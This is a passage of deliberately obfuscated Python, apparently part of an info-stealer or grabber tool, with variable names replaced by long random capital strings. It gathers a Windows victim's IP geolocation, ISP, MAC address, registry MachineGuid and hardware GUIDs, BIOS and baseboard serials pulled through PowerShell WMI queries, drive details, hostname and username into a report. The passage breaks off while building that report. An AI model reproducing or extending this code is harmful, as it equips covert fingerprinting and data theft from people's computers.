    SDERCMEGGQSIOKANVXBVZJNYHKIDDMKAMDVMIHPJDBNLMLQSMKTCEKWPJFFZDANGIJLEYKNYA = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('country', "None")
    SDERCMEGGQSIOKANVXBVZJNYHKIDDMKAMDVMIHPJDBNLMLQSMKTCEKWPJFFZDANGIJLEYKNYA_code = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('countryCode', "None")
    WLUTMGMFMXEQNANHDJCUSFVQXEMQNTNLUMAMWFYNSEWZPIWQBTIQASXXQWOHDIUOKTPBPCYGFJI = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('regionName', "None")
    WLUTMGMFMXEQNANHDJCUSFVQXEMQNTNLUMAMWFYNSEWZPIWQBTIQASXXQWOHDIUOKTPBPCYGFJI_code = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('region', "None")
    MTISSDZFWNYAXCERMRZCKAKRAOGUGHHSCQBOZXMZASZDHVTOHQPNEBLHKQJHEAORPQHLSSPB = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('zip', "None")
    PNJNDGJWQKFOYXQKFZUORYYNJPBGWCEGWIOLKQICZITAKSSOEHB = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('city', "None")
    LJFQIOVCCCQPZZGKDJPKOYKLZHCKJVDYDADBFVQMGSBEGLMYCPDHWRZXGZAJENHYRJPOQUGHFH = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('lat', "None")
    UGSICVXWUSHVJHITDDQOLTJNPLEYOKETLZEEDJJBLPJUNFTQXXGPIYZDRNBAWXONFROJUYVOVHIIEOQEW = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('lon', "None")
    AOWNABHYHTDZPDQTEUUIPKGPALJFGXKQREIALIMVAZJZRDMCYNVDOK = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('timezone', "None")
    YOITRQQPQBXAJWUFLXPJQZPCUXWIVTZKYEVNUPMHLNKQVMEGPVCRTEJORAOINCOY = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('isp', "None")
    VAJQACUMGTMNABPEEBAYXDYBTFCIFENJDDCNBODLNOZGUCUIHEAFIMLEMYXWGPQRQIVHGPR = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('org', "None")
    OUMDXVKKFONDGXGNBZYALLJETDCRAKACGVUNMZLMZQGAQIBSWGFJFDUPUAYSWCYRPO = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('as', "None")

def LPFGWRANZIRLPPONGQTBTSKOBXESXLUBFQSNJSPIMKVRKEXQBBPEMZKCRZCZMKSKBFMZMSLWYPNMZOXPD(DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM):
    import platform
    import subprocess
    import uuid
    import psutil
    import GPUtil
    import ctypes
    import win32api
    import string
    import screeninfo
    import winreg

    try: WAJINLNHCKCGXQRUJKHVERVXGXOWNUZSZGVMZRJMZRXNDZXPMMKDPUWHPUHAMWCCEDRGMWLY = platform.system()
    except: WAJINLNHCKCGXQRUJKHVERVXGXOWNUZSZGVMZRJMZRXNDZXPMMKDPUWHPUHAMWCCEDRGMWLY = "None"

    try: JSMNRXZRGBAKYXSGDVGAPDDYJEUHKPOFKTWWPQRARNGGWVRDVNMSUMAVWJZZSALSMARGTGTKPCBWZHNXQBD = platform.version()
    except: JSMNRXZRGBAKYXSGDVGAPDDYJEUHKPOFKTWWPQRARNGGWVRDVNMSUMAVWJZZSALSMARGTGTKPCBWZHNXQBD = "None"

    try: WDAOBJMLAVPEAZAUJYFYTYIZQLKRHSLCKGDGQQDBOAVZJKQPMKMDLTLENTMKNSZLBRZMBLFJBUGEVYVNJWTGNBZDDNNVJV = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except: WDAOBJMLAVPEAZAUJYFYTYIZQLKRHSLCKGDGQQDBOAVZJKQPMKMDLTLENTMKNSZLBRZMBLFJBUGEVYVNJWTGNBZDDNNVJV = "None"

    try: SWOZZALMWMVECHMBTBFYNXPRVGUEMYPOVFMKCMYKHNTJNUEHTWYZJNSRWJRXCWPNPIMKMCJSTDMGLPQMLQPGARLHEFN = str(round(psutil.virtual_memory().total / (1024**3), 2)) + "Go"
    except: SWOZZALMWMVECHMBTBFYNXPRVGUEMYPOVFMKCMYKHNTJNUEHTWYZJNSRWJRXCWPNPIMKMCJSTDMGLPQMLQPGARLHEFN = "None"

    try: SVQVLXXPWRZQXVVTDWDBBEHEBQTODMFBUNNJDPYZJTNSFEHVVAEZCOYGFXASHTDJMN = platform.processor()
    except: SVQVLXXPWRZQXVVTDWDBBEHEBQTODMFBUNNJDPYZJTNSFEHVVAEZCOYGFXASHTDJMN = "None"

    try: YUYUUTWRBQPMLZYCNUGMTZXNSAXBBBXZABOXTFAHMJUANJMDBPLWBHGYYURQDSCIVNFEOYP = str(psutil.cpu_count(logical=False)) + " Core"
    except: YUYUUTWRBQPMLZYCNUGMTZXNSAXBBBXZABOXTFAHMJUANJMDBPLWBHGYYURQDSCIVNFEOYP = "None"

    try: YWMKEFZCUGATGVWICRHWLRNZBYSKEZTRZQBWDVVXYWMWZCCSGYZVHFWYQWKYTCGOVDMJELXWJORRTJUQVPO = GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else "None"
    except: YWMKEFZCUGATGVWICRHWLRNZBYSKEZTRZQBWDVVXYWMWZCCSGYZVHFWYQWKYTCGOVDMJELXWJORRTJUQVPO = "None"

    CQVNIMPKNOCOVEVEOMTCIUISSTGBKILUWOJJTXTPBAVDCFMFKYJKRIJVPGWQYONHDYGILAONVUBGQFILOLHQYWTDUJSIBOLQHKZ                 = r"SOFTWARE\Microsoft\Cryptography"
    HBAQZTAMPPSCINPLOFOZGBEJORSHOPPQNZZQXEMIBFTAFUBGBB                    = r"SOFTWARE\Microsoft\SQMClient"
    CAITYGXDFTJAFCJUTKOBAEZCAZGYDOMJAHTHMCHKNVKSLLZTRZDKXVOLLTBS             = r"SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001"
    ZROYQPTDIYRZWHVIIYMVRLPMGAOJHCGAUVFANIICKZJCNSJECYCKAOMFEOOGQNJEJTQTSQXAHDIQANQFK                       = r'SOFTWARE\NVIDIA Corporation'
    BUAEXOYLKRJSCNTVMTIDEVTDSMUWSSNTRILFZUMDRRECVNYJMMUAGMWCQQYXQHFVXMVNAFFWGKDGEADTFYEXUAYTPLZ               = r'SYSTEM\HardwareConfig\Current'

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, CQVNIMPKNOCOVEVEOMTCIUISSTGBKILUWOJJTXTPBAVDCFMFKYJKRIJVPGWQYONHDYGILAONVUBGQFILOLHQYWTDUJSIBOLQHKZ, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "MachineGuid")
            MZSYFLQWUZNWRETTFTCZBEPRTNDIAHPLGFBDZWSAEINIIDINRKTKINAFOUPFNCMEMFURSROOGRFBAP = str(v4r_value).replace("{", "").replace("}", "")
    except: MZSYFLQWUZNWRETTFTCZBEPRTNDIAHPLGFBDZWSAEINIIDINRKTKINAFOUPFNCMEMFURSROOGRFBAP = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, CAITYGXDFTJAFCJUTKOBAEZCAZGYDOMJAHTHMCHKNVKSLLZTRZDKXVOLLTBS, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "GUID")
            MCSDATILBKFIBYPDBLDSAIMSGLGHQCKXXYRWNCUOWOCVJLKYQCNKYDUQCUJFDFIOFKSMGYEZROD = str(v4r_value).replace("{", "").replace("}", "")
    except: MCSDATILBKFIBYPDBLDSAIMSGLGHQCKXXYRWNCUOWOCVJLKYQCNKYDUQCUJFDFIOFKSMGYEZROD = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, CAITYGXDFTJAFCJUTKOBAEZCAZGYDOMJAHTHMCHKNVKSLLZTRZDKXVOLLTBS, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "HwProfileGuid")
            IQABSKMPWVGLTFYFECEIXNBNSSBNFEDARPESXLBHHFQLVUJPKMOLKEKX = str(v4r_value).replace("{", "").replace("}", "")
    except: IQABSKMPWVGLTFYFECEIXNBNSSBNFEDARPESXLBHHFQLVUJPKMOLKEKX = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, HBAQZTAMPPSCINPLOFOZGBEJORSHOPPQNZZQXEMIBFTAFUBGBB, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "MachineId")
            SQJQUQOEKJFDJLSMYGDVSOUBILDSASMNBHXDVKWCDNLGEPJXKSUSYIMCMYMAESJAJBWLNKDBAHDRKLWSEXCGRVUOQQQEJUSRDTG = str(v4r_value).replace("{", "").replace("}", "")
    except: SQJQUQOEKJFDJLSMYGDVSOUBILDSASMNBHXDVKWCDNLGEPJXKSUSYIMCMYMAESJAJBWLNKDBAHDRKLWSEXCGRVUOQQQEJUSRDTG = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, ZROYQPTDIYRZWHVIIYMVRLPMGAOJHCGAUVFANIICKZJCNSJECYCKAOMFEOOGQNJEJTQTSQXAHDIQANQFK+r'\Installer2', 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemID")
            FKOJNNQJLNMDQTYQLOITYSFMHIJZQXQCFWVSUCZGLBSJKVSAEBQNPSWVDMLPSYAXRAEGMURLVHYMTJOBXJZRKJJPJYIEUWTZUUGY = str(v4r_value).replace("{", "").replace("}", "")
    except: FKOJNNQJLNMDQTYQLOITYSFMHIJZQXQCFWVSUCZGLBSJKVSAEBQNPSWVDMLPSYAXRAEGMURLVHYMTJOBXJZRKJJPJYIEUWTZUUGY = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, BUAEXOYLKRJSCNTVMTIDEVTDSMUWSSNTRILFZUMDRRECVNYJMMUAGMWCQQYXQHFVXMVNAFFWGKDGEADTFYEXUAYTPLZ, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BaseBoardProduct")
            KWVAOPHCDZRIDJHLRQXVMWBBOPADPUCOCGGBEQTBMGNDPJNDZXTQ = str(v4r_value).replace("{", "").replace("}", "")
    except: KWVAOPHCDZRIDJHLRQXVMWBBOPADPUCOCGGBEQTBMGNDPJNDZXTQ = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, BUAEXOYLKRJSCNTVMTIDEVTDSMUWSSNTRILFZUMDRRECVNYJMMUAGMWCQQYXQHFVXMVNAFFWGKDGEADTFYEXUAYTPLZ, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BaseBoardManufacturer")
            MELHJEZRDFNLRFLPIHEUFIEPZWWVBKODOCVOZFZYLDADEFOXLBVDZQNLTZHUMPPDAICPSBMGXIFYFYDQPMG = str(v4r_value).replace("{", "").replace("}", "")
    except: MELHJEZRDFNLRFLPIHEUFIEPZWWVBKODOCVOZFZYLDADEFOXLBVDZQNLTZHUMPPDAICPSBMGXIFYFYDQPMG = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, BUAEXOYLKRJSCNTVMTIDEVTDSMUWSSNTRILFZUMDRRECVNYJMMUAGMWCQQYXQHFVXMVNAFFWGKDGEADTFYEXUAYTPLZ, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BIOSReleaseDate")
            JZISRFUPCAUFHLYNFOPFOVYYVGLUISZENYDHDLBNVRMXIGLLUXNNXAZQUZYZZAADWJCPJBLDZ = str(v4r_value).replace("{", "").replace("}", "")
    except: JZISRFUPCAUFHLYNFOPFOVYYVGLUISZENYDHDLBNVRMXIGLLUXNNXAZQUZYZZAADWJCPJBLDZ = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, BUAEXOYLKRJSCNTVMTIDEVTDSMUWSSNTRILFZUMDRRECVNYJMMUAGMWCQQYXQHFVXMVNAFFWGKDGEADTFYEXUAYTPLZ, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BIOSVersion")
            CEDITJHCRDZVRDQSUIVFODMDLWHKDXWIGKYMYRLTKEYMRKKZXLEMVECIOLQLOCLNXUACXIYOWCZBZXVKJAULPDE = str(v4r_value).replace("{", "").replace("}", "")
    except: CEDITJHCRDZVRDQSUIVFODMDLWHKDXWIGKYMYRLTKEYMRKKZXLEMVECIOLQLOCLNXUACXIYOWCZBZXVKJAULPDE = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, BUAEXOYLKRJSCNTVMTIDEVTDSMUWSSNTRILFZUMDRRECVNYJMMUAGMWCQQYXQHFVXMVNAFFWGKDGEADTFYEXUAYTPLZ, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemBiosVersion")
            QCFURSVZUOVUSIHBKAYBVMMHJGVNKQMSJRBJGEKOQIYPZVMHVEDLFEGWLFUDCMQUEQFQYLVJFJPIBGZBURGMLSSTPIYXQSYW = str(v4r_value).replace("{", "").replace("}", "")
    except: QCFURSVZUOVUSIHBKAYBVMMHJGVNKQMSJRBJGEKOQIYPZVMHVEDLFEGWLFUDCMQUEQFQYLVJFJPIBGZBURGMLSSTPIYXQSYW = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, BUAEXOYLKRJSCNTVMTIDEVTDSMUWSSNTRILFZUMDRRECVNYJMMUAGMWCQQYXQHFVXMVNAFFWGKDGEADTFYEXUAYTPLZ, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemVersion")
            IIYWWYPGYHAABFKADYWXZVOGDTTJUUBHAQTNXLMBGVKFCGVFOLEMHGSXEZRVAXUGXSSIDPOLLQZNJPBERBJQ = str(v4r_value).replace("{", "").replace("}", "")
    except: IIYWWYPGYHAABFKADYWXZVOGDTTJUUBHAQTNXLMBGVKFCGVFOLEMHGSXEZRVAXUGXSSIDPOLLQZNJPBERBJQ = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, BUAEXOYLKRJSCNTVMTIDEVTDSMUWSSNTRILFZUMDRRECVNYJMMUAGMWCQQYXQHFVXMVNAFFWGKDGEADTFYEXUAYTPLZ, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemFamily")
            IIISXCNJOQOZSJPFXMNVWLNKGGXMPBXIJHQXFAKLCQQCTBWYEFWUFFRIGNTHZLZNWOVZBKWSNLWEH = str(v4r_value).replace("{", "").replace("}", "")
    except: IIISXCNJOQOZSJPFXMNVWLNKGGXMPBXIJHQXFAKLCQQCTBWYEFWUFFRIGNTHZLZNWOVZBKWSNLWEH = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, BUAEXOYLKRJSCNTVMTIDEVTDSMUWSSNTRILFZUMDRRECVNYJMMUAGMWCQQYXQHFVXMVNAFFWGKDGEADTFYEXUAYTPLZ, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemManufacturer")
            AATXWYGNPDYGOUWEZIMRYQNVTKTUWSVYMAIKISUFQDAHRVHDOJCOCPCUPZIVLJRYKLRTGHSPRMRRZRLKSLZZDRBT = str(v4r_value).replace("{", "").replace("}", "")
    except: AATXWYGNPDYGOUWEZIMRYQNVTKTUWSVYMAIKISUFQDAHRVHDOJCOCPCUPZIVLJRYKLRTGHSPRMRRZRLKSLZZDRBT = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, BUAEXOYLKRJSCNTVMTIDEVTDSMUWSSNTRILFZUMDRRECVNYJMMUAGMWCQQYXQHFVXMVNAFFWGKDGEADTFYEXUAYTPLZ, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemProductName")
            OXYQZGVEIWBJUYZMFRFKKHFAPOYQGBGDHWWBMDFACUXNSLBVPVTGDVHXUKMNSYPIXHQTOYRT = str(v4r_value).replace("{", "").replace("}", "")
    except: OXYQZGVEIWBJUYZMFRFKKHFAPOYQGBGDHWWBMDFACUXNSLBVPVTGDVHXUKMNSYPIXHQTOYRT = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, BUAEXOYLKRJSCNTVMTIDEVTDSMUWSSNTRILFZUMDRRECVNYJMMUAGMWCQQYXQHFVXMVNAFFWGKDGEADTFYEXUAYTPLZ, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemSKU")
            PSTTQOCAMRWZHFJGWMBKUURGXMMEQWQXRYRHDEVLHPXWXGQNHUOWNUONWULFXDBKONKN = str(v4r_value).replace("{", "").replace("}", "")
    except: PSTTQOCAMRWZHFJGWMBKUURGXMMEQWQXRYRHDEVLHPXWXGQNHUOWNUONWULFXDBKONKN = None

    def RunPowershell(query):
        try:
            result = subprocess.check_output(
                ['powershell', '-Command', query],
                stderr=subprocess.STDOUT,
                text=True
            ).split('\n')[0].strip()
            return result if result else None
        except:
            return None

    try: IPEHOWHFEGBTQNREDNVRWGEISZBYFFGVSIVYTHHDWATSSMOENEYLVRRRZQKIMIYWVFZEMFMQTPVSABKCPHSPHGKBMIHQZEFZP = RunPowershell("(Get-WmiObject -Class Win32_ComputerSystemProduct).UUID")
    except: IPEHOWHFEGBTQNREDNVRWGEISZBYFFGVSIVYTHHDWATSSMOENEYLVRRRZQKIMIYWVFZEMFMQTPVSABKCPHSPHGKBMIHQZEFZP = None

    try: VITUAVYYTLGXGMNYOZNLBCXOYHLFFSAGEEMWDRGFWSGZTIVLDHMNYZOLGBPNQMSAPBGZBUAISKRHFSVWO = RunPowershell("(Get-WmiObject -Class Win32_BIOS).SerialNumber")
    except: VITUAVYYTLGXGMNYOZNLBCXOYHLFFSAGEEMWDRGFWSGZTIVLDHMNYZOLGBPNQMSAPBGZBUAISKRHFSVWO = None

    try: TGMJKLTQAEBCRKEAEQXVPYHUPSDVGIFPYGFUJAIZDEYLAEBUHTHKJUUYLWUGCTJMSEUVXGDPDAQFAZUDJ = RunPowershell("(Get-WmiObject -Class Win32_BaseBoard).SerialNumber")
    except: TGMJKLTQAEBCRKEAEQXVPYHUPSDVGIFPYGFUJAIZDEYLAEBUHTHKJUUYLWUGCTJMSEUVXGDPDAQFAZUDJ = None

    try: SEFLIRMDPPZVJSYHIEDYORCUOHMKGRCXMXPTABYEZMAZSKWIQKGIQROSJMCSIYDBR = RunPowershell("(Get-WmiObject -Class Win32_Processor).ProcessorId")
    except: SEFLIRMDPPZVJSYHIEDYORCUOHMKGRCXMXPTABYEZMAZSKWIQKGIQROSJMCSIYDBR = None

    try: PTODPGJQBTPOPBGYSAVVNMDHUBMYZFUMNCWTEJLADLSFYFAQSAMNYMSJIOIPVYNLNWWHCALEVBJH = RunPowershell("(Get-WmiObject -Class Win32_BIOS).OEMStringArray")
    except: PTODPGJQBTPOPBGYSAVVNMDHUBMYZFUMNCWTEJLADLSFYFAQSAMNYMSJIOIPVYNLNWWHCALEVBJH = None

    try: WYFTDGIPZTXEWCRLVAVGNTVKHJNTOJMFDFXJQMXNADQPQWRQWRXIEBYZMNVDDXWKDYNDWZLUKYRDHUXSNEKRIYHQGSWKZSFO = RunPowershell("(Get-WmiObject -Class Win32_SystemEnclosure).SMBIOSAssetTag")
    except: WYFTDGIPZTXEWCRLVAVGNTVKHJNTOJMFDFXJQMXNADQPQWRQWRXIEBYZMNVDDXWKDYNDWZLUKYRDHUXSNEKRIYHQGSWKZSFO = None
        
    try:
        JZANENKESPWVKCGLKXMEFPDBQCUVTFOSHJOICHGFIJYNUOZDYMMFOCXAETDVNBZXUOY = []
        DHWGZLITBRAAMDYTFSIGBYJBOKWXOMNFREHRGENWTBLEWJXITAKOTXWVJGMVTDWE = ctypes.windll.kernel32.GetLogicalDrives()
        for v4r_letter in string.ascii_uppercase:
            if DHWGZLITBRAAMDYTFSIGBYJBOKWXOMNFREHRGENWTBLEWJXITAKOTXWVJGMVTDWE & 1:
                THPZMHHNEWMMBUOZJSVWKSVVRAVCZNIVSUOPUCICZIJRWPRQQRDUHOEBXFBJTYPZT = v4r_letter + ":\\"
                try:
                    EIHMPZAXBVVFSMMCODPCHHNGBTRZVKYFOTIVLHVOURRCEGZWGLS = ctypes.c_ulonglong(0)
                    XDBVBQJNINOJMZWYEGOAOCCNSURXGJZIAJPUXUKPYKEORXITGZXXJHLHFBDIKTVFJLSOAFVGXSSGHEQG = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(THPZMHHNEWMMBUOZJSVWKSVVRAVCZNIVSUOPUCICZIJRWPRQQRDUHOEBXFBJTYPZT), None, ctypes.pointer(XDBVBQJNINOJMZWYEGOAOCCNSURXGJZIAJPUXUKPYKEORXITGZXXJHLHFBDIKTVFJLSOAFVGXSSGHEQG), ctypes.pointer(EIHMPZAXBVVFSMMCODPCHHNGBTRZVKYFOTIVLHVOURRCEGZWGLS))
                    WTJIPFWVIVTEAWBXVCOIQTGYVYKEKSVDSFYGJEKOHCTOZXGUJTEKNUVKVRDPYCBYWDAZCPLBHNSBFUHNVMBGZUUQ = XDBVBQJNINOJMZWYEGOAOCCNSURXGJZIAJPUXUKPYKEORXITGZXXJHLHFBDIKTVFJLSOAFVGXSSGHEQG.value
                    RRPKCRPQMBRKGXRCOSAHOZTLPIWJDOFZFZQZXRUFVULYARWXCWBSOIERQKREPHREMRYIWFA = EIHMPZAXBVVFSMMCODPCHHNGBTRZVKYFOTIVLHVOURRCEGZWGLS.value
                    ODQEDDPNHSOTVTVCWBUSJREZABQHPWMMJENSFVEBWZANKIVBCGFLXFXLZIPWUBKBPRQQPOWYQBN = WTJIPFWVIVTEAWBXVCOIQTGYVYKEKSVDSFYGJEKOHCTOZXGUJTEKNUVKVRDPYCBYWDAZCPLBHNSBFUHNVMBGZUUQ - RRPKCRPQMBRKGXRCOSAHOZTLPIWJDOFZFZQZXRUFVULYARWXCWBSOIERQKREPHREMRYIWFA
                    GPHPYMAMWDAGOYRPKFVDLFQYXJSDBLSZGWJWAIOSXHHBXWFGXCXDZXRRMKSEBJVHPS = win32api.GetVolumeInformation(THPZMHHNEWMMBUOZJSVWKSVVRAVCZNIVSUOPUCICZIJRWPRQQRDUHOEBXFBJTYPZT)[0]
                    drive = {
                        'drive': THPZMHHNEWMMBUOZJSVWKSVVRAVCZNIVSUOPUCICZIJRWPRQQRDUHOEBXFBJTYPZT,
                        'total': WTJIPFWVIVTEAWBXVCOIQTGYVYKEKSVDSFYGJEKOHCTOZXGUJTEKNUVKVRDPYCBYWDAZCPLBHNSBFUHNVMBGZUUQ,
                        'free': RRPKCRPQMBRKGXRCOSAHOZTLPIWJDOFZFZQZXRUFVULYARWXCWBSOIERQKREPHREMRYIWFA,
                        'used': ODQEDDPNHSOTVTVCWBUSJREZABQHPWMMJENSFVEBWZANKIVBCGFLXFXLZIPWUBKBPRQQPOWYQBN,
                        'name': GPHPYMAMWDAGOYRPKFVDLFQYXJSDBLSZGWJWAIOSXHHBXWFGXCXDZXRRMKSEBJVHPS,
                    }
                    JZANENKESPWVKCGLKXMEFPDBQCUVTFOSHJOICHGFIJYNUOZDYMMFOCXAETDVNBZXUOY.append(drive)
                except:
                    ()
            DHWGZLITBRAAMDYTFSIGBYJBOKWXOMNFREHRGENWTBLEWJXITAKOTXWVJGMVTDWE >>= 1

        ZZRHJCDWOMSOFIEERGOUZKSZZXSSLIQACHIIHMVENJPJHWHYVKOHJKJKFUPAIUUWDLQXU = "   {:<7} {:<10} {:<10} {:<10} {:<20}".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for v4r_drive in JZANENKESPWVKCGLKXMEFPDBQCUVTFOSHJOICHGFIJYNUOZDYMMFOCXAETDVNBZXUOY:
            FBVCDUINHSXYBKKQDGTJIMSVWVJRVKLNMKEPUZVWEMDHOUXCYEKFDEKRCIXPEWZYJBQJDDVFVZGYHXZSMRAZABBOR = (v4r_drive['used'] / v4r_drive['total']) * 100
            RRPKCRPQMBRKGXRCOSAHOZTLPIWJDOFZFZQZXRUFVULYARWXCWBSOIERQKREPHREMRYIWFA_gb = "{:.2f}GO".format(v4r_drive['free'] / (1024 ** 3))
            WTJIPFWVIVTEAWBXVCOIQTGYVYKEKSVDSFYGJEKOHCTOZXGUJTEKNUVKVRDPYCBYWDAZCPLBHNSBFUHNVMBGZUUQ_gb = "{:.2f}GO".format(v4r_drive['total'] / (1024 ** 3))
            FBVCDUINHSXYBKKQDGTJIMSVWVJRVKLNMKEPUZVWEMDHOUXCYEKFDEKRCIXPEWZYJBQJDDVFVZGYHXZSMRAZABBOR_str = "{:.2f}%".format(FBVCDUINHSXYBKKQDGTJIMSVWVJRVKLNMKEPUZVWEMDHOUXCYEKFDEKRCIXPEWZYJBQJDDVFVZGYHXZSMRAZABBOR)
            ZZRHJCDWOMSOFIEERGOUZKSZZXSSLIQACHIIHMVENJPJHWHYVKOHJKJKFUPAIUUWDLQXU += "\n - {:<7} {:<10} {:<10} {:<10} {:<20}".format(v4r_drive['drive'], 
                                                                   RRPKCRPQMBRKGXRCOSAHOZTLPIWJDOFZFZQZXRUFVULYARWXCWBSOIERQKREPHREMRYIWFA_gb,
                                                                   WTJIPFWVIVTEAWBXVCOIQTGYVYKEKSVDSFYGJEKOHCTOZXGUJTEKNUVKVRDPYCBYWDAZCPLBHNSBFUHNVMBGZUUQ_gb,
                                                                   FBVCDUINHSXYBKKQDGTJIMSVWVJRVKLNMKEPUZVWEMDHOUXCYEKFDEKRCIXPEWZYJBQJDDVFVZGYHXZSMRAZABBOR_str,
                                                                   v4r_drive['name'])
    except:
        ZZRHJCDWOMSOFIEERGOUZKSZZXSSLIQACHIIHMVENJPJHWHYVKOHJKJKFUPAIUUWDLQXU = """   Drive:  Free:      Total:     Use:       Name:       
   None    None       None       None       None     
"""

    try:
        def IsPortable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if IsPortable():
            WQASSLBOSBVRJSNJXWUZBZXULMGCSMCYFQGABDGVHNIJYZFFURKFQRYEGAQHQLWVZNDXJCS = 'Pc Portable'
        else:
            WQASSLBOSBVRJSNJXWUZBZXULMGCSMCYFQGABDGVHNIJYZFFURKFQRYEGAQHQLWVZNDXJCS = 'Pc Fixed'
    except:
        WQASSLBOSBVRJSNJXWUZBZXULMGCSMCYFQGABDGVHNIJYZFFURKFQRYEGAQHQLWVZNDXJCS = "None"

    try: BGHTEWGJLVSIJNTKOIIYBGUBHZBFFRVGNVNHYDSJJBLVCDGDBFLZXYYYOJESTWXOHVGDMLNTCEIAAQDJDREDMSZWBXETGCXNH = len(screeninfo.get_monitors())
    except: BGHTEWGJLVSIJNTKOIIYBGUBHZBFFRVGNVNHYDSJJBLVCDGDBFLZXYYYOJESTWXOHVGDMLNTCEIAAQDJDREDMSZWBXETGCXNH = "None"

    AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ_system_info = "Yes"
    HAZMCPMSLOTDYUWAUUBRRSEMTNOFIMXZCFRJPGEISDYFANTHNMFTBZDUPBACLQMOI = f"""
User Pc:
 - Hostname    : {SVALWHBMZPZGKTWIEUUFIYRCLNTPZYYUYTJUURDIKAQGIONLHSPOHGIPRKDZTSEFBIBMXXMTLCMUW}
 - Username    : {JHRBHNTPAZFVJZKLZFTZJOLALCVZTUDEPBZEGNGKBPIOPOZNRRSBNLOKWSWHRETKLSVGFMAOEVRIQKHKXALXJ}
